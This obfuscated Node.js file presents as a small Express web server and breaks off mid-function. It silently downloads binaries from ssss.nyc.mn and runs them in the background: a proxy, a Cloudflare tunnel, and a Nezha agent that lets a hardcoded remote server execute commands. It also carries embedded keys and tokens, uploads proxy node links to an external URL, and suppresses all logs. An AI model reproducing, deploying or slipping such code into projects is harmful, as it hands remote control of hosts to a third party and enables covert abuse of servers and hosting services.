const _0x966b64=_0x3b4c;(function(_0xd79dc5,_0x99bafd){const _0x51dc02={_0x5322dd:0xf8,_0xe38f68:0xcc},_0x215d5b=_0x3b4c,_0x390920=_0xd79dc5();while(!![]){try{const _0x37c540=parseInt(_0x215d5b(_0x51dc02._0x5322dd))/0x1*(-parseInt(_0x215d5b(0xdd))/0x2)+-parseInt(_0x215d5b(0xd0))/0x3+-parseInt(_0x215d5b(0x178))/0x4+parseInt(_0x215d5b(0x15f))/0x5+-parseInt(_0x215d5b(0xc1))/0x6*(parseInt(_0x215d5b(0xc4))/0x7)+-parseInt(_0x215d5b(_0x51dc02._0xe38f68))/0x8*(-parseInt(_0x215d5b(0x103))/0x9)+parseInt(_0x215d5b(0xb9))/0xa;if(_0x37c540===_0x99bafd)break;else _0x390920['push'](_0x390920['shift']());}catch(_0x3740b4){_0x390920['push'](_0x390920['shift']());}}}(_0x2555,0x9daed));const express=require(_0x966b64(0xbe)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x966b64(0x100)),{promisify}=require(_0x966b64(0xe1)),exec=promisify(require(_0x966b64(0xb8))[_0x966b64(0x12d)]),UPLOAD_URL=process[_0x966b64(0x113)][_0x966b64(0x138)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x966b64(0x17a)]||![],FILE_PATH=process[_0x966b64(0x113)][_0x966b64(0xc7)]||_0x966b64(0x16d),SUB_PATH=process['env']['SUB_PATH']||_0x966b64(0x13a),PORT=process['env']['SERVER_PORT']||process[_0x966b64(0x113)][_0x966b64(0x123)]||0xbb8,UUID=process[_0x966b64(0x113)]['UUID']||_0x966b64(0x172),NEZHA_SERVER=process[_0x966b64(0x113)][_0x966b64(0x10a)]||_0x966b64(0x164),NEZHA_PORT=process[_0x966b64(0x113)][_0x966b64(0x11e)]||'',NEZHA_KEY=process[_0x966b64(0x113)][_0x966b64(0x135)]||'dbGpiQIzsW1SAhOQNRhscT431qTXsMuu',ARGO_DOMAIN=process[_0x966b64(0x113)][_0x966b64(0x151)]||_0x966b64(0x163),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x966b64(0x14d),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x966b64(0xee)]||_0x966b64(0xe6),CFPORT=process['env'][_0x966b64(0xea)]||0x1bb,NAME=process[_0x966b64(0x113)]['NAME']||'';!fs[_0x966b64(0xf5)](FILE_PATH)?(fs[_0x966b64(0xeb)](FILE_PATH),console[_0x966b64(0x11a)](FILE_PATH+_0x966b64(0x128))):console[_0x966b64(0x11a)](FILE_PATH+_0x966b64(0xda));function generateRandomName(){const _0xc9ab78={_0x3a48a8:0x101,_0x5001ae:0xae},_0x22fa9e=_0x966b64,_0x3f9029=_0x22fa9e(0x16b);let _0x5f4ce6='';for(let _0x1d33af=0x0;_0x1d33af<0x6;_0x1d33af++){_0x5f4ce6+=_0x3f9029[_0x22fa9e(_0xc9ab78._0x3a48a8)](Math[_0x22fa9e(_0xc9ab78._0x5001ae)](Math['random']()*_0x3f9029['length']));}return _0x5f4ce6;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x966b64(0xc8)](FILE_PATH,npmName),phpPath=path[_0x966b64(0xc8)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x966b64(0xc8)](FILE_PATH,botName),subPath=path[_0x966b64(0xc8)](FILE_PATH,_0x966b64(0xfb)),listPath=path[_0x966b64(0xc8)](FILE_PATH,_0x966b64(0x171)),bootLogPath=path[_0x966b64(0xc8)](FILE_PATH,_0x966b64(0x142)),configPath=path[_0x966b64(0xc8)](FILE_PATH,'config.json');function deleteNodes(){const _0x707bea={_0x1fb436:0xd7,_0x494f71:0xe4,_0x5ea5ff:0xbd,_0x430d29:0xd4},_0x200fd6=_0x966b64;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x33ccde;try{_0x33ccde=fs['readFileSync'](subPath,_0x200fd6(0xd6));}catch{return null;}const _0x151807=Buffer[_0x200fd6(_0x707bea._0x1fb436)](_0x33ccde,_0x200fd6(_0x707bea._0x494f71))['toString']('utf-8'),_0x5aa618=_0x151807[_0x200fd6(0x175)]('\x0a')[_0x200fd6(_0x707bea._0x5ea5ff)](_0x4d3837=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4d3837));if(_0x5aa618[_0x200fd6(0x106)]===0x0)return;return axios['post'](UPLOAD_URL+_0x200fd6(0xc6),JSON['stringify']({'nodes':_0x5aa618}),{'headers':{'Content-Type':_0x200fd6(_0x707bea._0x430d29)}})[_0x200fd6(0x154)](_0x5edc2a=>{return null;}),null;}catch(_0x11c596){return null;}}function cleanupOldFiles(){try{const _0x2ba8af=fs['readdirSync'](FILE_PATH);_0x2ba8af['forEach'](_0x5f367c=>{const _0x5718ac=_0x3b4c,_0x221797=path[_0x5718ac(0xc8)](FILE_PATH,_0x5f367c);try{const _0x56ca04=fs['statSync'](_0x221797);_0x56ca04[_0x5718ac(0x155)]()&&fs[_0x5718ac(0x139)](_0x221797);}catch(_0x5e492d){}});}catch(_0x277dbf){}}async function generateConfig(){const _0x40e692={_0x5e1a26:0xce,_0x1e8215:0x13b,_0x27d9f4:0x116,_0x190579:0x14f,_0x4c1983:0x150,_0x227643:0xd8,_0x195a7c:0x132,_0xd916dc:0x116,_0x2158fe:0xd2,_0x3c8a0a:0x132,_0x4e2feb:0x13c,_0x173cac:0xc8},_0x121916=_0x966b64,_0x35cf11={'log':{'access':_0x121916(_0x40e692._0x5e1a26),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x121916(0xdc),'settings':{'clients':[{'id':UUID,'flow':_0x121916(_0x40e692._0x1e8215)}],'decryption':_0x121916(0x150),'fallbacks':[{'dest':0xbb9},{'path':_0x121916(0xd8),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x121916(_0x40e692._0x27d9f4),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x121916(_0x40e692._0x190579),'protocol':_0x121916(0xdc),'settings':{'clients':[{'id':UUID}],'decryption':_0x121916(_0x40e692._0x4c1983)},'streamSettings':{'network':_0x121916(0xe0),'security':'none'}},{'port':0xbba,'listen':_0x121916(0x14f),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x121916(_0x40e692._0x4c1983),'wsSettings':{'path':_0x121916(_0x40e692._0x227643)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x121916(0xd9),_0x121916(_0x40e692._0x195a7c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x121916(_0x40e692._0x190579),'protocol':_0x121916(0x177),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x121916(0x176)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x121916(0xd9),_0x121916(_0x40e692._0x195a7c)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x121916(_0x40e692._0x190579),'protocol':_0x121916(0xbc),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x121916(_0x40e692._0xd916dc)}},'sniffing':{'enabled':!![],'destOverride':[_0x121916(_0x40e692._0x2158fe),_0x121916(0xd9),_0x121916(_0x40e692._0x3c8a0a)],'metadataOnly':![]}}],'dns':{'servers':[_0x121916(0x144)]},'outbounds':[{'protocol':_0x121916(_0x40e692._0x4e2feb),'tag':'direct'},{'protocol':_0x121916(0x15b),'tag':_0x121916(0xe2)}]};fs['writeFileSync'](path[_0x121916(_0x40e692._0x173cac)](FILE_PATH,_0x121916(0xdb)),JSON[_0x121916(0x12f)](_0x35cf11,null,0x2));}function getSystemArchitecture(){const _0x4bf1b3={_0x203476:0x127},_0x24e22f=_0x966b64,_0x29beca=os[_0x24e22f(_0x4bf1b3._0x203476)]();return _0x29beca===_0x24e22f(0x11f)||_0x29beca===_0x24e22f(0xf4)||_0x29beca===_0x24e22f(0xf6)?_0x24e22f(0x11f):_0x24e22f(0x14a);}function downloadFile(_0x21d0a0,_0x38fe0b,_0x5138da){const _0x34914c={_0x47e949:0xf5,_0x122dc3:0x11c,_0x452fc3:0x154},_0x270fe5={_0x4f772c:0x134,_0x4dfb76:0x108,_0x5958bc:0xe9},_0x140941={_0x4e3c42:0x15a,_0x1d8799:0xb0},_0x2bb3d9=_0x966b64,_0x33c55e=_0x21d0a0;!fs[_0x2bb3d9(_0x34914c._0x47e949)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x358160=fs[_0x2bb3d9(0xcf)](_0x33c55e);axios({'method':_0x2bb3d9(_0x34914c._0x122dc3),'url':_0x38fe0b,'responseType':_0x2bb3d9(0x110)})[_0x2bb3d9(0x12a)](_0x5a2641=>{const _0x7c2126={_0x2eb2ae:0x16f,_0xa026f9:0x15e},_0x1d9f17=_0x2bb3d9;_0x5a2641[_0x1d9f17(0x137)][_0x1d9f17(_0x270fe5._0x4f772c)](_0x358160),_0x358160['on'](_0x1d9f17(_0x270fe5._0x4dfb76),()=>{const _0x1a7527=_0x1d9f17;_0x358160[_0x1a7527(_0x7c2126._0x2eb2ae)](),console[_0x1a7527(0x11a)]('Download\x20'+path[_0x1a7527(0x105)](_0x33c55e)+_0x1a7527(_0x7c2126._0xa026f9)),_0x5138da(null,_0x33c55e);}),_0x358160['on'](_0x1d9f17(_0x270fe5._0x5958bc),_0x5d7a81=>{const _0x5c9d2b=_0x1d9f17;fs[_0x5c9d2b(_0x140941._0x4e3c42)](_0x33c55e,()=>{});const _0x24b229=_0x5c9d2b(0x12b)+path['basename'](_0x33c55e)+_0x5c9d2b(0x122)+_0x5d7a81[_0x5c9d2b(_0x140941._0x1d8799)];console[_0x5c9d2b(0xe9)](_0x24b229),_0x5138da(_0x24b229);});})[_0x2bb3d9(_0x34914c._0x452fc3)](_0x3375c4=>{const _0x2bec7d=_0x2bb3d9,_0x1d4d70=_0x2bec7d(0x12b)+path['basename'](_0x33c55e)+_0x2bec7d(0x122)+_0x3375c4[_0x2bec7d(0xb0)];console[_0x2bec7d(0xe9)](_0x1d4d70),_0x5138da(_0x1d4d70);});}async function downloadFilesAndRun(){const _0x37cbcd={_0x3df5ca:0x11a,_0x118a7a:0xcb,_0x1c1e23:0x124,_0xf6c098:0x179,_0x1c7312:0x129,_0x4361cf:0x169,_0x520353:0xe3,_0xbaa3ea:0x166,_0x3f722e:0xed,_0x53494f:0x11b,_0x48b899:0xbf,_0x156ed2:0x10f,_0x10c6b1:0x170,_0x57f21f:0x11d,_0xa38812:0x13d,_0x4dc185:0xcb,_0x4d6119:0x15d,_0x1d665e:0x16c,_0x39d6c7:0x117,_0x190457:0xb1,_0x2b3ea9:0xf5,_0x185d1c:0x14c,_0x1719c6:0xe9},_0x11b438={_0x842398:0x16e},_0x1eeeb5=_0x966b64,_0x2f813c=getSystemArchitecture(),_0x1d49c6=getFilesForArchitecture(_0x2f813c);if(_0x1d49c6[_0x1eeeb5(0x106)]===0x0){console[_0x1eeeb5(_0x37cbcd._0x3df5ca)](_0x1eeeb5(0xc0));return;}const _0x2b7f2d=_0x1d49c6['map'](_0x14a89e=>{return new Promise((_0x59da33,_0x463fe6)=>{const _0x55f0f7=_0x3b4c;downloadFile(_0x14a89e['fileName'],_0x14a89e[_0x55f0f7(0xc2)],(_0x2eb946,_0x46995d)=>{_0x2eb946?_0x463fe6(_0x2eb946):_0x59da33(_0x46995d);});});});try{await Promise[_0x1eeeb5(0x157)](_0x2b7f2d);}catch(_0x3024ee){console['error'](_0x1eeeb5(0xdf),_0x3024ee);return;}function _0x252f7c(_0x9d9e12){const _0x86bf4b=_0x1eeeb5,_0x356235=0x1fd;_0x9d9e12[_0x86bf4b(_0x11b438._0x842398)](_0x219fe0=>{const _0x2029fd={_0x50548f:0xb7,_0x400586:0x11a},_0x1573d9=_0x86bf4b;fs['existsSync'](_0x219fe0)&&fs[_0x1573d9(0x104)](_0x219fe0,_0x356235,_0x4e0ba3=>{const _0x182907=_0x1573d9;_0x4e0ba3?console[_0x182907(0xe9)](_0x182907(_0x2029fd._0x50548f)+_0x219fe0+':\x20'+_0x4e0ba3):console[_0x182907(_0x2029fd._0x400586)](_0x182907(0x147)+_0x219fe0+':\x20'+_0x356235[_0x182907(0x143)](0x8));});});}const _0x4d4b35=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x252f7c(_0x4d4b35);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x20f8c8=NEZHA_SERVER[_0x1eeeb5(_0x37cbcd._0x118a7a)](':')?NEZHA_SERVER[_0x1eeeb5(0x175)](':')[_0x1eeeb5(_0x37cbcd._0x1c1e23)]():'',_0x164003=new Set([_0x1eeeb5(0x14e),_0x1eeeb5(0x170),'2096',_0x1eeeb5(0xfe),'2083',_0x1eeeb5(0x13d)]),_0x3ab2a8=_0x164003[_0x1eeeb5(_0x37cbcd._0xf6c098)](_0x20f8c8)?_0x1eeeb5(0xb5):'false',_0x54432b='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1eeeb5(_0x37cbcd._0x1c7312)+NEZHA_SERVER+_0x1eeeb5(_0x37cbcd._0x4361cf)+_0x3ab2a8+_0x1eeeb5(0x107)+UUID;fs[_0x1eeeb5(_0x37cbcd._0x520353)](path[_0x1eeeb5(0xc8)](FILE_PATH,_0x1eeeb5(_0x37cbcd._0xbaa3ea)),_0x54432b);const _0xbd6f14=_0x1eeeb5(0xff)+phpPath+_0x1eeeb5(_0x37cbcd._0x3f722e)+FILE_PATH+_0x1eeeb5(_0x37cbcd._0x53494f);try{await exec(_0xbd6f14),console[_0x1eeeb5(0x11a)](phpName+_0x1eeeb5(_0x37cbcd._0x48b899)),await new Promise(_0x1a08bf=>setTimeout(_0x1a08bf,0x3e8));}catch(_0x139767){console['error'](_0x1eeeb5(_0x37cbcd._0x156ed2)+_0x139767);}}else{let _0x2428d1='';const _0x208689=['443',_0x1eeeb5(_0x37cbcd._0x10c6b1),_0x1eeeb5(_0x37cbcd._0x57f21f),_0x1eeeb5(0xfe),'2083',_0x1eeeb5(_0x37cbcd._0xa38812)];_0x208689[_0x1eeeb5(_0x37cbcd._0x4dc185)](NEZHA_PORT)&&(_0x2428d1=_0x1eeeb5(0xfc));const _0x498a1a=_0x1eeeb5(0xff)+npmPath+_0x1eeeb5(0xc9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1eeeb5(_0x37cbcd._0x4d6119)+NEZHA_KEY+'\x20'+_0x2428d1+_0x1eeeb5(_0x37cbcd._0x1d665e);try{await exec(_0x498a1a),console['log'](npmName+_0x1eeeb5(_0x37cbcd._0x48b899)),await new Promise(_0x373add=>setTimeout(_0x373add,0x3e8));}catch(_0x5fb86e){console[_0x1eeeb5(0xe9)]('npm\x20running\x20error:\x20'+_0x5fb86e);}}}else console[_0x1eeeb5(0x11a)](_0x1eeeb5(_0x37cbcd._0x39d6c7));const _0x2cfdb1='nohup\x20'+webPath+_0x1eeeb5(0x120)+FILE_PATH+_0x1eeeb5(_0x37cbcd._0x190457);try{await exec(_0x2cfdb1),console[_0x1eeeb5(0x11a)](webName+'\x20is\x20running'),await new Promise(_0x22945b=>setTimeout(_0x22945b,0x3e8));}catch(_0x4187cf){console['error'](_0x1eeeb5(0x12e)+_0x4187cf);}if(fs[_0x1eeeb5(_0x37cbcd._0x2b3ea9)](botPath)){let _0x42837a;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x42837a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1eeeb5(0x109)](/TunnelSecret/)?_0x42837a=_0x1eeeb5(0xef)+FILE_PATH+_0x1eeeb5(_0x37cbcd._0x185d1c):_0x42837a=_0x1eeeb5(0x130)+FILE_PATH+_0x1eeeb5(0x118)+ARGO_PORT;try{await exec(_0x1eeeb5(0xff)+botPath+'\x20'+_0x42837a+_0x1eeeb5(0xaf)),console['log'](botName+_0x1eeeb5(0xbf)),await new Promise(_0x2484fe=>setTimeout(_0x2484fe,0x7d0));}catch(_0x5513bd){console[_0x1eeeb5(_0x37cbcd._0x1719c6)](_0x1eeeb5(0xd5)+_0x5513bd);}}await new Promise(_0x594d34=>setTimeout(_0x594d34,0x1388));}function _0x2555(){const _0x2546cc=['all','?encryption=none&security=tls&sni=','Error\x20reading\x20boot.log:','unlink','blackhole','countryCode','\x20-p\x20','\x20successfully','79235JTFEUk','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Nodes\x20uploaded\x20successfully','pkill\x20-f\x20\x22[','sjc.yjj.gv.uy','agent.yjj.gv.uy:80','readFileSync','config.yaml','\x22\x20>\x20/dev/null\x202>&1','auto','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','status','abcdefghijklmnopqrstuvwxyz','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','.tmp','forEach','close','8443','list.txt','dbbf603e-8c3a-4c4a-aecd-628afe8f62cc','platform','\x0a\x0avmess://','split','/vmess-argo','vmess','3259792omNUOK','has','AUTO_ACCESS','floor','\x20>/dev/null\x202>&1\x20&','message','/config.json\x20>/dev/null\x202>&1\x20&','replace','clear','isp','true','test','Empowerment\x20failed\x20for\x20','child_process','32600980MgZYZH','TunnelSecret','Add\x20automatic\x20access\x20task\x20faild:\x20','trojan','filter','express','\x20is\x20running','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','13284kEOIOb','fileUrl','https://arm64.ssss.nyc.mn/bot','3185hUtHYp','\x0a\x20\x20tunnel:\x20','/api/delete-nodes','FILE_PATH','join','\x20-s\x20','Unknown','includes','8eHLDqS','&fp=firefox&type=ws&host=','/dev/null','createWriteStream','996576eAWfoF','\x0a\x20\x20credentials-file:\x20','http','?security=tls&sni=','application/json','Error\x20executing\x20command:\x20','utf-8','from','/vless-argo','tls','\x20already\x20exists','config.json','vless','25288FtvEnk','promises','Error\x20downloading\x20files:','tcp','util','block','writeFileSync','base64','Mozilla/5.0','saas.sin.fan','del\x20/f\x20/q\x20','\x20>\x20nul\x202>&1','error','CFPORT','mkdirSync','Subscription\x20uploaded\x20successfully','\x20-c\x20\x22','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','taskkill\x20/f\x20/im\x20','org','https://amd64.ssss.nyc.mn/agent','arm64','existsSync','aarch64','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','101oJnAXL','listen','tunnel.json','sub.txt','--tls','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','2087','nohup\x20','path','charAt','firefox','7213302VCOoyV','chmod','basename','length','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','finish','match','NEZHA_SERVER','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','text/plain;\x20charset=utf-8','substring','&path=%2Ftrojan-argo%3Fed%3D2560#','php\x20running\x20error:\x20','stream','unshift','ArgoDomain:','env','/api/add-nodes','https://arm64.ssss.nyc.mn/agent','/trojan-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','App\x20is\x20running','log','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','get','2096','NEZHA_PORT','arm','\x20-c\x20','/api/add-subscriptions','\x20failed:\x20','PORT','pop','country_code','post','arch','\x20is\x20created','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','then','Download\x20','automatic\x20access\x20task\x20added\x20successfully','exec','web\x20running\x20error:\x20','stringify','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','success','quic','win32','pipe','NEZHA_KEY','readFile','data','UPLOAD_URL','unlinkSync','cheng6797','xtls-rprx-vision','freedom','2053','index.html','\x0avless://','push','http\x20server\x20is\x20running\x20on\x20port:','boot.log','toString','https+local://8.8.8.8/dns-query','Error\x20in\x20startserver:','response','Empowerment\x20success\x20for\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tunnel.yml','amd','https://api.ip.sb/geoip','/tunnel.yml\x20run','eyJhIjoiMWVjODU2ZjVlMGVjZDhlYmI4NjAxODFiYTY3MjBiOWQiLCJ0IjoiNzczODU2MGYtMTBmZC00ODY5LTk0MWUtZjIyMTNkMzljYjViIiwicyI6Ik1qTmhZVEJrWm1JdE5XWXlOeTAwWlRSakxUa3dPRGd0T1dWaU1XTXlZV1pqTXpJdyJ9','443','127.0.0.1','none','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/web','utf8','catch','isFile','send'];_0x2555=function(){return _0x2546cc;};return _0x2555();}function getFilesForArchitecture(_0x5a8075){const _0x1d5b06={_0x37b915:0x11f,_0x4802d5:0x152,_0x39dcd8:0xf3,_0x4b7a30:0x111},_0x5ea7e9=_0x966b64;let _0x16d07b;_0x5a8075===_0x5ea7e9(_0x1d5b06._0x37b915)?_0x16d07b=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5ea7e9(0xc3)}]:_0x16d07b=[{'fileName':webPath,'fileUrl':_0x5ea7e9(_0x1d5b06._0x4802d5)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x476f8f=_0x5a8075==='arm'?_0x5ea7e9(0x115):_0x5ea7e9(_0x1d5b06._0x39dcd8);_0x16d07b[_0x5ea7e9(_0x1d5b06._0x4b7a30)]({'fileName':npmPath,'fileUrl':_0x476f8f});}else{const _0x24523a=_0x5a8075===_0x5ea7e9(_0x1d5b06._0x37b915)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x16d07b[_0x5ea7e9(0x111)]({'fileName':phpPath,'fileUrl':_0x24523a});}}return _0x16d07b;}function argoType(){const _0x4c3add={_0x5fae8d:0xe3,_0xd40f7e:0xc8,_0x17a932:0xc5,_0x5ed687:0xd1,_0x3dd7c2:0xfa,_0x277670:0x148,_0x78da78:0xc8,_0x2a9390:0x149},_0x294a34=_0x966b64;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x294a34(0xcb)](_0x294a34(0xba))){fs[_0x294a34(_0x4c3add._0x5fae8d)](path[_0x294a34(_0x4c3add._0xd40f7e)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0xeb6d3a=_0x294a34(_0x4c3add._0x17a932)+ARGO_AUTH[_0x294a34(0x175)]('\x22')[0xb]+_0x294a34(_0x4c3add._0x5ed687)+path[_0x294a34(0xc8)](FILE_PATH,_0x294a34(_0x4c3add._0x3dd7c2))+_0x294a34(0xf7)+ARGO_DOMAIN+_0x294a34(0x10b)+ARGO_PORT+_0x294a34(_0x4c3add._0x277670);fs[_0x294a34(0xe3)](path[_0x294a34(_0x4c3add._0x78da78)](FILE_PATH,_0x294a34(_0x4c3add._0x2a9390)),_0xeb6d3a);}else console['log'](_0x294a34(0xf0));}async function extractDomains(){const _0x344a4a={_0x3f0da1:0x11a,_0x2f1326:0x165,_0x181906:0xc8,_0x4f9be2:0xd6,_0x201589:0x11a,_0x329be5:0xc8,_0x5a8ff4:0x142,_0x59347e:0x11a,_0x57cf1c:0xe9,_0x351d37:0x159},_0x1c278b={_0x422b65:0x14b,_0x12025b:0x137,_0x52f552:0xb4,_0x12065e:0xb2,_0x525079:0x137,_0x4bc529:0x16a,_0xa00a97:0x15c,_0x205a6c:0xf2},_0x19bf74={_0x386ae5:0x101,_0x28237f:0x167},_0x567ed2={_0x2bcf94:0x140},_0x28b153=_0x966b64;let _0x4e2aec;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4e2aec=ARGO_DOMAIN,console[_0x28b153(_0x344a4a._0x3f0da1)]('ARGO_DOMAIN:',_0x4e2aec),await _0x4083cf(_0x4e2aec);else try{const _0x57725f=fs[_0x28b153(_0x344a4a._0x2f1326)](path[_0x28b153(_0x344a4a._0x181906)](FILE_PATH,_0x28b153(0x142)),_0x28b153(_0x344a4a._0x4f9be2)),_0x15b1c9=_0x57725f['split']('\x0a'),_0x2c4f59=[];_0x15b1c9[_0x28b153(0x16e)](_0x27006d=>{const _0x1df70b=_0x28b153,_0x467539=_0x27006d[_0x1df70b(0x109)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x467539){const _0x156fbe=_0x467539[0x1];_0x2c4f59[_0x1df70b(_0x567ed2._0x2bcf94)](_0x156fbe);}});if(_0x2c4f59[_0x28b153(0x106)]>0x0)_0x4e2aec=_0x2c4f59[0x0],console[_0x28b153(_0x344a4a._0x201589)](_0x28b153(0x112),_0x4e2aec),await _0x4083cf(_0x4e2aec);else{console['log'](_0x28b153(0x160)),fs[_0x28b153(0x139)](path[_0x28b153(_0x344a4a._0x329be5)](FILE_PATH,_0x28b153(_0x344a4a._0x5a8ff4)));async function _0x2ffb2c(){const _0xae2db7=_0x28b153;try{process['platform']==='win32'?await exec(_0xae2db7(0xf1)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0xae2db7(0x162)+botName[_0xae2db7(_0x19bf74._0x386ae5)](0x0)+']'+botName[_0xae2db7(0x10d)](0x1)+_0xae2db7(_0x19bf74._0x28237f));}catch(_0x641df4){}}_0x2ffb2c(),await new Promise(_0x52b1ec=>setTimeout(_0x52b1ec,0xbb8));const _0x488b7f=_0x28b153(0x130)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x28b153(0xff)+botPath+'\x20'+_0x488b7f+'\x20>/dev/null\x202>&1\x20&'),console[_0x28b153(_0x344a4a._0x59347e)](botName+_0x28b153(0xbf)),await new Promise(_0x4ec3=>setTimeout(_0x4ec3,0xbb8)),await extractDomains();}catch(_0x54694c){console[_0x28b153(_0x344a4a._0x57cf1c)]('Error\x20executing\x20command:\x20'+_0x54694c);}}}catch(_0x1489e3){console[_0x28b153(0xe9)](_0x28b153(_0x344a4a._0x351d37),_0x1489e3);}async function _0x517335(){const _0x1438a6=_0x28b153;try{const _0x229f3f=await axios[_0x1438a6(0x11c)](_0x1438a6(_0x1c278b._0x422b65),{'headers':{'User-Agent':_0x1438a6(0xe5),'timeout':0xbb8}});if(_0x229f3f[_0x1438a6(0x137)]&&_0x229f3f['data'][_0x1438a6(0x125)]&&_0x229f3f[_0x1438a6(0x137)][_0x1438a6(0xb4)])return(_0x229f3f['data'][_0x1438a6(0x125)]+'-'+_0x229f3f[_0x1438a6(_0x1c278b._0x12025b)][_0x1438a6(_0x1c278b._0x52f552)])[_0x1438a6(_0x1c278b._0x12065e)](/\s+/g,'_');}catch(_0x4b92ca){try{const _0x44c54f=await axios[_0x1438a6(0x11c)]('http://ip-api.com/json',{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x44c54f[_0x1438a6(_0x1c278b._0x12025b)]&&_0x44c54f[_0x1438a6(_0x1c278b._0x525079)][_0x1438a6(_0x1c278b._0x4bc529)]===_0x1438a6(0x131)&&_0x44c54f['data'][_0x1438a6(_0x1c278b._0xa00a97)]&&_0x44c54f['data'][_0x1438a6(_0x1c278b._0x205a6c)])return(_0x44c54f['data'][_0x1438a6(_0x1c278b._0xa00a97)]+'-'+_0x44c54f[_0x1438a6(0x137)][_0x1438a6(0xf2)])[_0x1438a6(0xb2)](/\s+/g,'_');}catch(_0x3a0c7a){}}return _0x1438a6(0xca);}async function _0x4083cf(_0x12e02b){const _0x35b490={_0x2eb6cb:0x168,_0x5a84d3:0x150,_0x597263:0xd9,_0x22ff49:0xcd,_0x1f9fd6:0xd7,_0x5a7572:0x143,_0x5b7c28:0xe4,_0x1c29ab:0xd3,_0x5c7c1a:0x11a,_0xf9f4a6:0x143},_0x26b058=await _0x517335(),_0xd64ab=NAME?NAME+'-'+_0x26b058:_0x26b058;return new Promise(_0x4292cf=>{const _0x5207a7={_0xfdc4ed:0xd7,_0x244a29:0x143,_0x32f08d:0x10c};setTimeout(()=>{const 